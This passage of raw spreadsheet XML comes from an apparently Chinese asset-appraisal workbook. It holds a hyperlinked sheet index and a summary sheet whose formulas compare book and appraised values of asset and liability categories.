        </is>
      </c>
      <c r="L104" s="518" t="n">
        <v>100</v>
      </c>
      <c r="M104" s="518" t="n">
        <v>8</v>
      </c>
    </row>
    <row r="105">
      <c r="A105" s="518" t="inlineStr">
        <is>
          <t>9-非财务信息汇总表</t>
        </is>
      </c>
      <c r="C105" s="518" t="inlineStr">
        <is>
          <t>非财务信息汇总表</t>
        </is>
      </c>
      <c r="L105" s="518" t="n">
        <v>100</v>
      </c>
      <c r="M105" s="518" t="n">
        <v>7</v>
      </c>
    </row>
  </sheetData>
  <hyperlinks>
    <hyperlink ref="A2" location="'1-汇总表'!A1" display="0-其他方法结论"/>
    <hyperlink ref="C2" location="'1-汇总表'!A1" display="0-其他方法结论"/>
    <hyperlink ref="A3" location="'2-分类汇总'!A1" display="1-汇总表"/>
    <hyperlink ref="A4" location="'3-流动资产汇总'!A1" display="2-分类汇总"/>
    <hyperlink ref="A5" location="'表3-1货币资金汇总表'!A1" display="3-流动资产汇总"/>
    <hyperlink ref="A7" location="'3-1-1现金'!A1" display="3-1货币资金汇总表"/>
    <hyperlink ref="A8" location="'3-1-2银行存款'!A1" display="3-1-1现金"/>
    <hyperlink ref="A9" location="'3-1-3其他货币资金'!A1" display="3-1-2银行存款"/>
    <hyperlink ref="A10" location="'3-2交易性金融资产汇总'!A1" display="3-1-3其他货币资金"/>
    <hyperlink ref="A11" location="'3-2-1-股票'!A1" display="3-2交易性金融资产汇总"/>
    <hyperlink ref="A12" location="'3-2-2-债券'!A1" display="3-2-1-股票"/>
    <hyperlink ref="A13" location="'3-2-3-基金'!A1" display="3-2-2-债券"/>
    <hyperlink ref="A14" location="'3-3衍生金融资产'!A1" display="3-2-3-基金"/>
    <hyperlink ref="A15" location="'3-4应收票据'!A1" display="3-3衍生金融资产"/>
    <hyperlink ref="A16" location="'3-5应收账款'!A1" display="3-4应收票据"/>
    <hyperlink ref="A17" location="'3-6应收款项融资'!A1" display="3-5应收账款"/>
    <hyperlink ref="A18" location="'3-7预付款项'!A1" display="3-6应收款项融资"/>
    <hyperlink ref="A19" location="'3-8其他应收款汇总'!A1" display="3-7预付款项"/>
    <hyperlink ref="A20" location="'3-8-1应收利息'!A1" display="3-8其他应收款汇总"/>
    <hyperlink ref="A21" location="'3-8-2应收股利'!A1" display="3-8-1应收利息"/>
    <hyperlink ref="A22" location="'3-8-3其他应收款'!A1" display="3-8-2应收股利"/>
    <hyperlink ref="A23" location="'3-9存货汇总'!A1" display="3-8-3其他应收款"/>
    <hyperlink ref="A24" location="'3-9-1材料采购（在途物资）'!A1" display="3-9存货汇总"/>
    <hyperlink ref="A25" location="'3-9-2原材料'!A1" display="3-9-1材料采购（在途物资）"/>
    <hyperlink ref="A26" location="'3-9-3在库周转材料'!A1" display="3-9-2原材料"/>
    <hyperlink ref="A27" location="'3-9-4委托加工物资'!A1" display="3-9-3在库周转材料"/>
    <hyperlink ref="A28" location="'3-9-5产成品（库存商品）'!A1" display="3-9-4委托加工物资"/>
    <hyperlink ref="A29" location="'3-9-6在产品（自制半成品）'!A1" display="3-9-5产成品（库存商品）"/>
    <hyperlink ref="A30" location="'3-9-7发出商品'!A1" display="3-9-6在产品（自制半成品）"/>
    <hyperlink ref="A31" location="'3-9-8在用周转材料'!A1" display="3-9-7发出商品"/>
    <hyperlink ref="A32" location="'3-10合同资产'!A1" display="3-9-8在用周转材料"/>
    <hyperlink ref="A33" location="'3-10合同资产'!A1" display="3-9-9合同履约成本"/>
    <hyperlink ref="A34" location="'3-11持有待售资产'!A1" display="3-10合同资产"/>
    <hyperlink ref="A35" location="'3-12一年到期非流动资产'!A1" display="3-11持有待售资产"/>
    <hyperlink ref="A36" location="'3-13其他流动资产'!A1" display="3-12一年到期非流动资产"/>
    <hyperlink ref="A37" location="'4-非流动资产汇总'!A1" display="3-13其他流动资产"/>
    <hyperlink ref="A38" location="'4-1债权投资'!A1" display="4-非流动资产汇总"/>
    <hyperlink ref="A39" location="'4-2其他债权投资'!A1" display="4-1债权投资"/>
    <hyperlink ref="A40" location="'4-3长期应收'!A1" display="4-2其他债权投资"/>
    <hyperlink ref="A41" location="'4-4股权投资'!A1" display="4-3长期应收"/>
    <hyperlink ref="A42" location="'4-5其他权益工具投资'!A1" display="4-4股权投资"/>
    <hyperlink ref="A43" location="'4-6其他非流动金融资产'!A1" display="4-5其他权益工具投资"/>
    <hyperlink ref="A44" location="'4-6-1-股票'!A1" display="4-6其他非流动金融资产"/>
    <hyperlink ref="A45" location="'4-6-2-债券'!A1" display="4-6-1-股票"/>
    <hyperlink ref="A46" location="'4-6-3-基金'!A1" display="4-6-2-债券"/>
    <hyperlink ref="A47" location="'4-7-1投资性房地产'!A1" display="4-6-3-基金"/>
    <hyperlink ref="A48" location="'4-7-2投资性房地产'!A1" display="4-7投资性房地产汇总"/>
    <hyperlink ref="A49" location="'4-7-3投资性地产'!A1" display="4-7-1投资性房地产"/>
    <hyperlink ref="A50" location="'4-7-4投资性地产'!A1" display="4-7-2投资性房地产"/>
    <hyperlink ref="A51" location="'4-8固定资产汇总'!A1" display="4-7-3投资性地产"/>
    <hyperlink ref="A52" location="'4-8-1房屋建筑物'!A1" display="4-7-4投资性地产"/>
    <hyperlink ref="A53" location="'4-8-2构筑物'!A1" display="4-8固定资产汇总"/>
    <hyperlink ref="A54" location="'4-8-3管道沟槽'!A1" display="4-8-1房屋建筑物"/>
    <hyperlink ref="A55" location="'4-8-4机器设备'!A1" display="4-8-2构筑物"/>
    <hyperlink ref="A56" location="'4-8-5车辆'!A1" display="4-8-3管道沟槽"/>
    <hyperlink ref="A57" location="'4-8-6电子设备'!A1" display="4-8-4机器设备"/>
    <hyperlink ref="A58" location="'4-8-7固定资产清理'!A1" display="4-8-5车辆"/>
    <hyperlink ref="A59" location="'4-9在建工程汇总'!A1" display="4-8-6电子设备"/>
    <hyperlink ref="A60" location="'4-9-1在建（土建）'!A1" display="4-8-7固定资产清理"/>
    <hyperlink ref="A61" location="'4-9-2在建（设备）'!A1" display="4-9在建工程汇总"/>
    <hyperlink ref="A62" location="'4-9-3在建工程（工程物资）'!A1" display="4-9-1在建（土建）"/>
    <hyperlink ref="A63" location="'4-10生产性生物资产'!A1" display="4-9-2在建（设备）"/>
    <hyperlink ref="A64" location="'4-11油气资产'!A1" display="4-9-3在建工程（工程物资）"/>
    <hyperlink ref="A65" location="'4-12使用权资产'!A1" display="4-10生产性生物资产"/>
    <hyperlink ref="A66" location="'4-13无形资产汇总'!A1" display="4-11油气资产"/>
    <hyperlink ref="A67" location="'4-13-1无形-土地'!A1" display="4-12使用权资产"/>
    <hyperlink ref="A68" location="'4-13-2无形-矿业权'!A1" display="4-13无形资产汇总"/>
    <hyperlink ref="A69" location="'4-13-3无形-其他'!A1" display="4-13-1无形-土地"/>
    <hyperlink ref="A70" location="'4-14开发支出'!A1" display="4-13-2无形-矿业权"/>
    <hyperlink ref="A71" location="'4-15商誉'!A1" display="4-13-3无形-其他"/>
    <hyperlink ref="A72" location="'4-16长期待摊费用'!A1" display="4-14开发支出"/>
    <hyperlink ref="A73" location="'4-17递延所得税资产'!A1" display="4-15商誉"/>
    <hyperlink ref="A74" location="'4-18其他非流动资产'!A1" display="4-16长期待摊费用"/>
    <hyperlink ref="A75" location="'5-流动负债汇总'!A1" display="4-17递延所得税资产"/>
    <hyperlink ref="A76" location="'5-1短期借款'!A1" display="4-18其他非流动资产"/>
    <hyperlink ref="A77" location="'5-2交易性金融负债'!A1" display="5-流动负债汇总"/>
    <hyperlink ref="A78" location="'5-3衍生金融负债'!A1" display="5-1短期借款"/>
    <hyperlink ref="A79" location="'5-4应付票据'!A1" display="5-2交易性金融负债"/>
    <hyperlink ref="A80" location="'5-5应付账款'!A1" display="5-3衍生金融负债"/>
    <hyperlink ref="A81" location="'5-6预收款项'!A1" display="5-4应付票据"/>
    <hyperlink ref="A82" location="'5-7合同负债'!A1" display="5-5应付账款"/>
    <hyperlink ref="A83" location="'5-8职工薪酬'!A1" display="5-6预收款项"/>
    <hyperlink ref="A84" location="'5-9应交税费'!A1" display="5-7合同负债"/>
    <hyperlink ref="A85" location="'5-10其他应付款汇总表'!A1" display="5-8职工薪酬"/>
    <hyperlink ref="A86" location="'5-10-1应付利息'!A1" display="5-9应交税费"/>
    <hyperlink ref="A87" location="'5-10-2应付股利（利润）'!A1" display="5-10其他应付款汇总表"/>
    <hyperlink ref="A88" location="'5-10-3其他应付款'!A1" display="5-10-1应付利息"/>
    <hyperlink ref="A89" location="'5-11持有待售负债'!A1" display="5-10-2应付股利（利润）"/>
    <hyperlink ref="A90" location="'5-12一年到期非流动负债'!A1" display="5-10-3其他应付款"/>
    <hyperlink ref="A91" location="'5-13其他流动负债'!A1" display="5-11持有待售负债"/>
    <hyperlink ref="A92" location="'6-非流动负债汇总'!A1" display="5-12一年到期非流动负债"/>
    <hyperlink ref="A93" location="'6-1长期借款'!A1" display="5-13其他流动负债"/>
    <hyperlink ref="A94" location="'6-2应付债券'!A1" display="6-非流动负债汇总"/>
    <hyperlink ref="A95" location="'6-3租赁负债'!A1" display="6-1长期借款"/>
    <hyperlink ref="A96" location="'6-4长期应付款'!A1" display="6-2应付债券"/>
    <hyperlink ref="A97" location="'6-5长期应付职工薪酬'!A1" display="6-3租赁负债"/>
    <hyperlink ref="A98" location="'6-6预计负债'!A1" display="6-4长期应付款"/>
    <hyperlink ref="A99" location="'6-7递延收益'!A1" display="6-5长期应付职工薪酬"/>
    <hyperlink ref="A100" location="'6-8递延所得税负债'!A1" display="6-6预计负债"/>
    <hyperlink ref="A101" location="'6-9其他非流动负债'!A1" display="6-7递延收益"/>
    <hyperlink ref="A102" location="'净资产汇总'!A1" display="6-8递延所得税负债"/>
  </hyperlinks>
  <pageMargins left="0.75" right="0.75" top="1" bottom="0.972222222222222" header="0.5" footer="0.597222222222222"/>
  <pageSetup orientation="portrait" paperSize="9"/>
  <headerFooter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3">
    <tabColor rgb="FFFF0000"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr/>
  </sheetPr>
  <dimension ref="B2:K24"/>
  <sheetViews>
    <sheetView showZeros="0" workbookViewId="0">
      <selection activeCell="E12" sqref="E12"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="17.6"/>
  <cols>
    <col width="21.3333333333333" customWidth="1" style="415" min="2" max="2"/>
    <col width="12.3333333333333" customWidth="1" style="415" min="3" max="5"/>
    <col width="14.3333333333333" customWidth="1" style="415" min="6" max="6"/>
    <col width="21.6666666666667" customWidth="1" style="415" min="9" max="9"/>
    <col width="20.1666666666667" customWidth="1" style="415" min="10" max="10"/>
    <col width="21" customWidth="1" style="415" min="11" max="11"/>
  </cols>
  <sheetData>
    <row r="2" ht="18.35" customHeight="1" s="415">
      <c r="B2" s="389" t="n"/>
      <c r="C2" s="389" t="n"/>
      <c r="D2" s="389" t="n"/>
      <c r="E2" s="389" t="n"/>
      <c r="F2" s="389" t="inlineStr">
        <is>
          <t>单位：万元</t>
        </is>
      </c>
      <c r="I2" s="389" t="n"/>
      <c r="J2" s="389" t="n"/>
      <c r="K2" s="485" t="inlineStr">
        <is>
          <t>单位：元</t>
        </is>
      </c>
    </row>
    <row r="3" ht="18.35" customHeight="1" s="415">
      <c r="B3" s="486" t="inlineStr">
        <is>
          <t>项  目</t>
        </is>
      </c>
      <c r="C3" s="487" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="D3" s="487" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="E3" s="487" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="F3" s="488" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="I3" s="489" t="inlineStr">
        <is>
          <t>资产项目</t>
        </is>
      </c>
      <c r="J3" s="487" t="inlineStr">
        <is>
          <t>账面原值</t>
        </is>
      </c>
      <c r="K3" s="488" t="inlineStr">
        <is>
          <t>账面净值</t>
        </is>
      </c>
    </row>
    <row r="4">
      <c r="B4" s="523" t="n"/>
      <c r="C4" s="491" t="inlineStr">
        <is>
          <t>A</t>
        </is>
      </c>
      <c r="D4" s="491" t="inlineStr">
        <is>
          <t>B</t>
        </is>
      </c>
      <c r="E4" s="491" t="inlineStr">
        <is>
          <t>C=B-A</t>
        </is>
      </c>
      <c r="F4" s="492" t="inlineStr">
        <is>
          <t>D=C/A×100</t>
        </is>
      </c>
      <c r="I4" s="493" t="inlineStr">
        <is>
          <t>流动资产</t>
        </is>
      </c>
      <c r="J4" s="524" t="n"/>
      <c r="K4" s="525">
        <f>IF('2-分类汇总'!E6="","",'2-分类汇总'!E6)</f>
        <v/>
      </c>
    </row>
    <row r="5">
      <c r="B5" s="493" t="inlineStr">
        <is>
          <t>流动资产</t>
        </is>
      </c>
      <c r="C5" s="526">
        <f>IF('1-汇总表'!E7="","",ROUND('1-汇总表'!E7,2))</f>
        <v/>
      </c>
      <c r="D5" s="526">
        <f>IF('1-汇总表'!F7="","",ROUND('1-汇总表'!F7,2))</f>
        <v/>
      </c>
      <c r="E5" s="526">
        <f>IF('1-汇总表'!G7="","",ROUND('1-汇总表'!G7,2))</f>
        <v/>
      </c>
      <c r="F5" s="527">
        <f>IF('1-汇总表'!H7="","",ROUND('1-汇总表'!H7,2))</f>
        <v/>
      </c>
      <c r="I5" s="498" t="inlineStr">
        <is>
          <t>存货</t>
        </is>
      </c>
      <c r="J5" s="524" t="n"/>
      <c r="K5" s="525">
        <f>IF('2-分类汇总'!E15="","",ROUND('2-分类汇总'!E15,2))</f>
        <v/>
      </c>
    </row>
    <row r="6">
      <c r="B6" s="499" t="inlineStr">
        <is>
          <t xml:space="preserve">   存货</t>
        </is>
      </c>
      <c r="C6" s="526">
        <f>IF('2-分类汇总'!E15="","",ROUND('2-分类汇总'!E15/10000,2))</f>
        <v/>
      </c>
      <c r="D6" s="526">
        <f>IF('2-分类汇总'!F15="","",ROUND('2-分类汇总'!F15/10000,2))</f>
        <v/>
      </c>
      <c r="E6" s="526">
        <f>IF('2-分类汇总'!G15="","",ROUND('2-分类汇总'!G15/10000,2))</f>
        <v/>
      </c>
      <c r="F6" s="527">
        <f>IF('2-分类汇总'!H15="","",ROUND('2-分类汇总'!H15,2))</f>
        <v/>
      </c>
      <c r="I6" s="500" t="inlineStr">
        <is>
          <t>非流动资产</t>
        </is>
      </c>
      <c r="J6" s="524" t="n"/>
      <c r="K6" s="525">
        <f>IF('2-分类汇总'!E20="","",ROUND('2-分类汇总'!E20,2))</f>
        <v/>
      </c>
    </row>
    <row r="7">
      <c r="B7" s="493" t="inlineStr">
        <is>
          <t>非流动资产</t>
        </is>
      </c>
      <c r="C7" s="526">
        <f>IF('1-汇总表'!E8="","",ROUND('1-汇总表'!E8,2))</f>
        <v/>
      </c>
      <c r="D7" s="526">
        <f>IF('1-汇总表'!F8="","",ROUND('1-汇总表'!F8,2))</f>
        <v/>
      </c>
      <c r="E7" s="526">
        <f>IF('1-汇总表'!G8="","",ROUND('1-汇总表'!G8,2))</f>
        <v/>
      </c>
      <c r="F7" s="527">
        <f>IF('1-汇总表'!H8="","",ROUND('1-汇总表'!H8,2))</f>
        <v/>
      </c>
      <c r="I7" s="501" t="inlineStr">
        <is>
          <t xml:space="preserve">  长期股权投资</t>
        </is>
      </c>
      <c r="J7" s="524" t="n"/>
      <c r="K7" s="525">
        <f>IF('2-分类汇总'!E24="","",ROUND('2-分类汇总'!E24,2))</f>
        <v/>
      </c>
    </row>
    <row r="8">
      <c r="B8" s="502" t="inlineStr">
        <is>
          <t xml:space="preserve">   长期股权投资</t>
        </is>
      </c>
      <c r="C8" s="526">
        <f>IF('1-汇总表'!E12="","",ROUND('1-汇总表'!E12,2))</f>
        <v/>
      </c>
      <c r="D8" s="526">
        <f>IF('1-汇总表'!F12="","",ROUND('1-汇总表'!F12,2))</f>
        <v/>
      </c>
      <c r="E8" s="526">
        <f>IF('1-汇总表'!G12="","",ROUND('1-汇总表'!G12,2))</f>
        <v/>
      </c>
      <c r="F8" s="527">
        <f>IF('1-汇总表'!H12="","",ROUND('1-汇总表'!H12,2))</f>
        <v/>
      </c>
      <c r="I8" s="500" t="inlineStr">
        <is>
          <t xml:space="preserve">  投资性房地产</t>
        </is>
      </c>
      <c r="J8" s="524" t="n"/>
      <c r="K8" s="525">
        <f>IF('2-分类汇总'!E27="","",ROUND('2-分类汇总'!E27,2))</f>
        <v/>
      </c>
    </row>
    <row r="9">
      <c r="B9" s="502" t="inlineStr">
        <is>
          <t xml:space="preserve">   投资性房地产</t>
        </is>
      </c>
      <c r="C9" s="526">
        <f>IF('1-汇总表'!E15="","",ROUND('1-汇总表'!E15,2))</f>
        <v/>
      </c>
      <c r="D9" s="526">
        <f>IF('1-汇总表'!F15="","",ROUND('1-汇总表'!F15,2))</f>
        <v/>
      </c>
      <c r="E9" s="526">
        <f>IF('1-汇总表'!G15="","",ROUND('1-汇总表'!G15,2))</f>
        <v/>
      </c>
      <c r="F9" s="527">
        <f>IF('1-汇总表'!H15="","",ROUND('1-汇总表'!H15,2))</f>
        <v/>
      </c>
      <c r="I9" s="493" t="inlineStr">
        <is>
          <t xml:space="preserve">  固定资产</t>
        </is>
      </c>
      <c r="J9" s="524">
        <f>IF('4-8固定资产汇总'!E20="","",ROUND('4-8固定资产汇总'!E20,2))</f>
        <v/>
      </c>
      <c r="K9" s="525">
        <f>IF('2-分类汇总'!E28="","",ROUND('2-分类汇总'!E28,2))</f>
        <v/>
      </c>
    </row>
    <row r="10">
      <c r="B10" s="502" t="inlineStr">
        <is>
          <t xml:space="preserve">   固定资产</t>
        </is>
      </c>
      <c r="C10" s="526">
        <f>IF('1-汇总表'!E16="","",ROUND('1-汇总表'!E16,2))</f>
        <v/>
      </c>
      <c r="D10" s="526">
        <f>IF('1-汇总表'!F16="","",ROUND('1-汇总表'!F16,2))</f>
        <v/>
      </c>
      <c r="E10" s="526">
        <f>IF('1-汇总表'!G16="","",ROUND('1-汇总表'!G16,2))</f>
        <v/>
      </c>
      <c r="F10" s="527">
        <f>IF('1-汇总表'!H16="","",ROUND('1-汇总表'!H16,2))</f>
        <v/>
      </c>
      <c r="I10" s="493" t="inlineStr">
        <is>
          <t xml:space="preserve">  其中：建筑物类 </t>
        </is>
      </c>
      <c r="J10" s="524">
        <f>IF('4-8固定资产汇总'!E10="","",ROUND('4-8固定资产汇总'!E10,2))</f>
        <v/>
      </c>
      <c r="K10" s="525">
        <f>IF('4-8固定资产汇总'!F10="","",ROUND('4-8固定资产汇总'!F10,2))</f>
        <v/>
      </c>
    </row>
    <row r="11">
      <c r="B11" s="502" t="inlineStr">
        <is>
          <t xml:space="preserve">   其中：建筑物类</t>
        </is>
      </c>
      <c r="C11" s="526">
        <f>IF('4-8固定资产汇总'!F10="","",ROUND('4-8固定资产汇总'!F10/10000,2))</f>
        <v/>
      </c>
      <c r="D11" s="526">
        <f>IF('4-8固定资产汇总'!H10="","",ROUND('4-8固定资产汇总'!H10/10000,2))</f>
        <v/>
      </c>
      <c r="E11" s="526">
        <f>IF('4-8固定资产汇总'!J10="","",ROUND('4-8固定资产汇总'!J10/10000,2))</f>
        <v/>
      </c>
      <c r="F11" s="527">
        <f>IF('4-8固定资产汇总'!L9="","",ROUND('4-8固定资产汇总'!L9,2))</f>
        <v/>
      </c>
      <c r="I11" s="499" t="inlineStr">
        <is>
          <t xml:space="preserve">        设备类</t>
        </is>
      </c>
      <c r="J11" s="524">
        <f>IF('4-8固定资产汇总'!E16="","",ROUND('4-8固定资产汇总'!E16,2))</f>
        <v/>
      </c>
      <c r="K11" s="525">
        <f>IF('4-8固定资产汇总'!F16="","",ROUND('4-8固定资产汇总'!F16,2))</f>
        <v/>
      </c>
    </row>
    <row r="12">
      <c r="B12" s="502" t="inlineStr">
        <is>
          <t xml:space="preserve">         设备类</t>
        </is>
      </c>
      <c r="C12" s="526">
        <f>IF('4-8固定资产汇总'!F16="","",ROUND('4-8固定资产汇总'!F16/10000,2))</f>
        <v/>
      </c>
      <c r="D12" s="526">
        <f>IF('4-8固定资产汇总'!H16="","",ROUND('4-8固定资产汇总'!H16/10000,2))</f>
        <v/>
      </c>
      <c r="E12" s="526">
        <f>IF('4-8固定资产汇总'!J16="","",ROUND('4-8固定资产汇总'!J16/10000,2))</f>
        <v/>
      </c>
      <c r="F12" s="527">
        <f>IF('4-8固定资产汇总'!L16="","",ROUND('4-8固定资产汇总'!L16,2))</f>
        <v/>
      </c>
      <c r="I12" s="499" t="inlineStr">
        <is>
          <t xml:space="preserve">  在建工程</t>
        </is>
      </c>
      <c r="J12" s="524" t="n"/>
      <c r="K12" s="525">
        <f>IF('2-分类汇总'!E29="","",ROUND('2-分类汇总'!E29,2))</f>
        <v/>
      </c>
    </row>
    <row r="13">
      <c r="B13" s="502" t="inlineStr">
        <is>
          <t xml:space="preserve">   在建工程</t>
        </is>
      </c>
      <c r="C13" s="526">
        <f>IF('1-汇总表'!E17="","",ROUND('1-汇总表'!E17,2))</f>
        <v/>
      </c>
      <c r="D13" s="526">
        <f>IF('1-汇总表'!F17="","",ROUND('1-汇总表'!F17,2))</f>
        <v/>
      </c>
      <c r="E13" s="526">
        <f>IF('1-汇总表'!G17="","",ROUND('1-汇总表'!G17,2))</f>
        <v/>
      </c>
      <c r="F13" s="527">
        <f>IF('1-汇总表'!H17="","",ROUND('1-汇总表'!H17,2))</f>
        <v/>
      </c>
      <c r="I13" s="499" t="inlineStr">
        <is>
          <t xml:space="preserve">  无形资产</t>
        </is>
      </c>
      <c r="J13" s="524" t="n"/>
      <c r="K13" s="525">
        <f>IF('2-分类汇总'!E33="","",ROUND('2-分类汇总'!E33,2))</f>
        <v/>
      </c>
    </row>
    <row r="14">
      <c r="B14" s="502" t="inlineStr">
        <is>
          <t xml:space="preserve">   无形资产</t>
        </is>
      </c>
      <c r="C14" s="526">
        <f>IF('1-汇总表'!E21="","",ROUND('1-汇总表'!E21,2))</f>
        <v/>
      </c>
      <c r="D14" s="526">
        <f>IF('1-汇总表'!F21="","",ROUND('1-汇总表'!F21,2))</f>
        <v/>
      </c>
      <c r="E14" s="526">
        <f>IF('1-汇总表'!G21="","",ROUND('1-汇总表'!G21,2))</f>
        <v/>
      </c>
      <c r="F14" s="527">
        <f>IF('1-汇总表'!H21="","",ROUND('1-汇总表'!H21,2))</f>
        <v/>
      </c>
      <c r="I14" s="499" t="inlineStr">
        <is>
          <t xml:space="preserve">  其中：土地使用权</t>
        </is>
      </c>
      <c r="J14" s="524">
        <f>IF('4-13-1无形-土地'!L30="","",ROUND('4-13-1无形-土地'!L30,2))</f>
        <v/>
      </c>
      <c r="K14" s="525">
        <f>IF('4-13无形资产汇总'!E6="","",ROUND('4-13无形资产汇总'!E6,2))</f>
        <v/>
      </c>
    </row>
    <row r="15">
      <c r="B15" s="502" t="inlineStr">
        <is>
          <t xml:space="preserve">   其中：土地使用权</t>
        </is>
      </c>
      <c r="C15" s="526">
        <f>IF('4-13无形资产汇总'!E6="","",ROUND('4-13无形资产汇总'!E6/10000,2))</f>
        <v/>
      </c>
      <c r="D15" s="526">
        <f>IF('4-13无形资产汇总'!F6="","",ROUND('4-13无形资产汇总'!F6/10000,2))</f>
        <v/>
      </c>
      <c r="E15" s="526">
        <f>IF('4-13无形资产汇总'!G6="","",ROUND('4-13无形资产汇总'!G6/10000,2))</f>
        <v/>
      </c>
      <c r="F15" s="527">
        <f>IF('4-13无形资产汇总'!H6="","",ROUND('4-13无形资产汇总'!H6,2))</f>
        <v/>
      </c>
      <c r="I15" s="493" t="inlineStr">
        <is>
          <t xml:space="preserve">  长期待摊费用</t>
        </is>
      </c>
      <c r="J15" s="524" t="n"/>
      <c r="K15" s="525">
        <f>IF('2-分类汇总'!E36="","",ROUND('2-分类汇总'!E36,2))</f>
        <v/>
      </c>
    </row>
    <row r="16">
      <c r="B16" s="502" t="inlineStr">
        <is>
          <t xml:space="preserve">   长期待摊费用</t>
        </is>
      </c>
      <c r="C16" s="526">
        <f>IF('1-汇总表'!E24="","",ROUND('1-汇总表'!E24,2))</f>
        <v/>
      </c>
      <c r="D16" s="526">
        <f>IF('1-汇总表'!F24="","",ROUND('1-汇总表'!F24,2))</f>
        <v/>
      </c>
      <c r="E16" s="526">
        <f>IF('1-汇总表'!G24="","",ROUND('1-汇总表'!G24,2))</f>
        <v/>
      </c>
      <c r="F16" s="527">
        <f>IF('1-汇总表'!H24="","",ROUND('1-汇总表'!H24,2))</f>
        <v/>
      </c>
      <c r="I16" s="493" t="inlineStr">
        <is>
          <t xml:space="preserve">  递延所得税资产</t>
        </is>
      </c>
      <c r="J16" s="524" t="n"/>
      <c r="K16" s="525">
        <f>IF('2-分类汇总'!E37="","",ROUND('2-分类汇总'!E37,2))</f>
        <v/>
      </c>
    </row>
    <row r="17">
      <c r="B17" s="502" t="inlineStr">
        <is>
          <t xml:space="preserve">   递延所得税资产</t>
        </is>
      </c>
      <c r="C17" s="526">
        <f>IF('1-汇总表'!E25="","",ROUND('1-汇总表'!E25,2))</f>
        <v/>
      </c>
      <c r="D17" s="526">
        <f>IF('1-汇总表'!F25="","",ROUND('1-汇总表'!F25,2))</f>
        <v/>
      </c>
      <c r="E17" s="526">
        <f>IF('1-汇总表'!G25="","",ROUND('1-汇总表'!G25,2))</f>
        <v/>
      </c>
      <c r="F17" s="527">
        <f>IF('1-汇总表'!H25="","",ROUND('1-汇总表'!H25,2))</f>
        <v/>
      </c>
      <c r="I17" s="493" t="inlineStr">
        <is>
          <t xml:space="preserve">  其他非流动资产</t>
        </is>
      </c>
      <c r="J17" s="524" t="n"/>
      <c r="K17" s="525">
        <f>IF('2-分类汇总'!E38="","",ROUND('2-分类汇总'!E38,2))</f>
        <v/>
      </c>
    </row>
    <row r="18">
      <c r="B18" s="502" t="inlineStr">
        <is>
          <t xml:space="preserve">   其他非流动资产</t>
        </is>
      </c>
      <c r="C18" s="526">
        <f>IF('1-汇总表'!E26="","",ROUND('1-汇总表'!E26,2))</f>
        <v/>
      </c>
      <c r="D18" s="526">
        <f>IF('1-汇总表'!F26="","",ROUND('1-汇总表'!F26,2))</f>
        <v/>
      </c>
      <c r="E18" s="526">
        <f>IF('1-汇总表'!G26="","",ROUND('1-汇总表'!G26,2))</f>
        <v/>
      </c>
      <c r="F18" s="527">
        <f>IF('1-汇总表'!H26="","",ROUND('1-汇总表'!H26,2))</f>
        <v/>
      </c>
      <c r="I18" s="501" t="inlineStr">
        <is>
          <t>资产总计</t>
        </is>
      </c>
      <c r="J18" s="528" t="n"/>
      <c r="K18" s="529">
        <f>IF('2-分类汇总'!E39="","",ROUND('2-分类汇总'!E39,2))</f>
        <v/>
      </c>
    </row>
    <row r="19">
      <c r="B19" s="507" t="inlineStr">
        <is>
          <t xml:space="preserve">    资产总计</t>
        </is>
      </c>
      <c r="C19" s="530">
        <f>IF('1-汇总表'!E27="","",ROUND('1-汇总表'!E27,2))</f>
        <v/>
      </c>
      <c r="D19" s="530">
        <f>IF('1-汇总表'!F27="","",ROUND('1-汇总表'!F27,2))</f>
        <v/>
      </c>
      <c r="E19" s="530">
        <f>IF('1-汇总表'!G27="","",ROUND('1-汇总表'!G27,2))</f>
        <v/>
      </c>
      <c r="F19" s="530">
        <f>IF('1-汇总表'!H27="","",ROUND('1-汇总表'!H27,2))</f>
        <v/>
      </c>
      <c r="I19" s="509" t="inlineStr">
        <is>
          <t xml:space="preserve">  流动负债</t>
        </is>
      </c>
      <c r="J19" s="524" t="n"/>
      <c r="K19" s="525">
        <f>IF('2-分类汇总'!E40="","",ROUND('2-分类汇总'!E40,2))</f>
        <v/>
      </c>
    </row>
    <row r="20">
      <c r="B20" s="493" t="inlineStr">
        <is>
          <t>流动负债</t>
        </is>
      </c>
      <c r="C20" s="526">
        <f>IF('1-汇总表'!E28="","",ROUND('1-汇总表'!E28,2))</f>
        <v/>
      </c>
      <c r="D20" s="526">
        <f>IF('1-汇总表'!F28="","",ROUND('1-汇总表'!F28,2))</f>
        <v/>
      </c>
      <c r="E20" s="526">
        <f>IF('1-汇总表'!G28="","",ROUND('1-汇总表'!G28,2))</f>
        <v/>
      </c>
      <c r="F20" s="527">
        <f>IF('1-汇总表'!H28="","",ROUND('1-汇总表'!H28,2))</f>
        <v/>
      </c>
      <c r="I20" s="509" t="inlineStr">
        <is>
          <t xml:space="preserve">  非流动负债</t>
        </is>
      </c>
      <c r="J20" s="524" t="n"/>
      <c r="K20" s="525">
        <f>IF('2-分类汇总'!E54="","",ROUND('2-分类汇总'!E54,2))</f>
        <v/>
      </c>
    </row>
    <row r="21">
      <c r="B21" s="510" t="inlineStr">
        <is>
          <t>非流动负债</t>
        </is>
      </c>
      <c r="C21" s="530">
        <f>IF('1-汇总表'!E29="","",ROUND('1-汇总表'!E29,2))</f>
        <v/>
      </c>
      <c r="D21" s="530">
        <f>IF('1-汇总表'!F29="","",ROUND('1-汇总表'!F29,2))</f>
        <v/>
      </c>
      <c r="E21" s="530">
        <f>IF('1-汇总表'!G29="","",ROUND('1-汇总表'!G29,2))</f>
        <v/>
      </c>
      <c r="F21" s="527">
        <f>IF('1-汇总表'!H29="","",ROUND('1-汇总表'!H29,2))</f>
        <v/>
      </c>
      <c r="I21" s="501" t="inlineStr">
        <is>
          <t>负债合计</t>
        </is>
      </c>
      <c r="J21" s="528" t="n"/>
      <c r="K21" s="529">
        <f>IF('2-分类汇总'!E64="","",ROUND('2-分类汇总'!E64,2))</f>
        <v/>
      </c>
    </row>
    <row r="22" ht="18.35" customHeight="1" s="415">
      <c r="B22" s="507" t="inlineStr">
        <is>
          <t xml:space="preserve">    负债合计</t>
        </is>
      </c>
      <c r="C22" s="530">
